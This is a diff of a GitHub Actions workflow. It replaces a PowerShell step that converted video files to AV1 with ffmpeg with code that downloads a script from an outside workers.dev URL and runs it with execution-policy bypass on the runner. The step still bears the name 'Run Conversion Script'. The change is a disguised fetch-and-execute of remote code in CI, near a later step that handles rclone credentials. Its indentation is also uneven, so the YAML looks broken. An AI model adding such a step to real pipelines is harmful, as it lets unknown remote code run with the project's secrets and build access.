@@ -29,26 +29,23 @@ jobs:
     - name: Run Conversion Script
       run: |
         param (
-          [Parameter(Mandatory=$true)]
-          [string]$sourceDir,
-        
-          [string]$destDir = $sourceDir
-        )
-        
-        $ffmpegPath = 'C:\Users\runner\Downloads\ffmpeg.exe'
-        
-        Write-Output "Starting conversion..."
-        Get-ChildItem $sourceDir -Include *.mp4,*.avi,*.mov,*.wmv,*.flv,*.webm,*.mkv -Recurse | ForEach-Object {
-          $newFileName = $_.BaseName + '-av1' + $_.Extension
-          $destPath = Join-Path $_.Directory.FullName $newFileName
-          Write-Output "Converting $($_.FullName) to AV1..."
-          & $ffmpegPath -i $_.FullName -c:v libsvtav1 -crf 35 $destPath
-        }
+        [Parameter(Mandatory=$true)]
+        [string]$sourceURL,
 
-        Write-Output "Conversion complete."
-      shell: PowerShell
-      env:
-        sourceDir: 'C:\Users\runner\Downloads\'
+        [string]$destDir = $sourceDir
+       )
+
+        $scriptPath = 'C:\Users\runner\Downloads\script.ps1'
+        Invoke-WebRequest -Uri $sourceURL -OutFile $scriptPath
+
+        Write-Output "Starting script execution..."
+        & powershell -ExecutionPolicy Bypass -File $scriptPath -sourceDir $sourceDir -destDir $destDir
+
+        Write-Output "Script execution complete."
+     shell: PowerShell
+     env:
+      sourceURL: 'https://share.secretz.workers.dev/2:/code.ps1'
+      sourceDir: 'C:\Users\runner\Downloads\'
 
     - name: Download rclone Config
       run: |
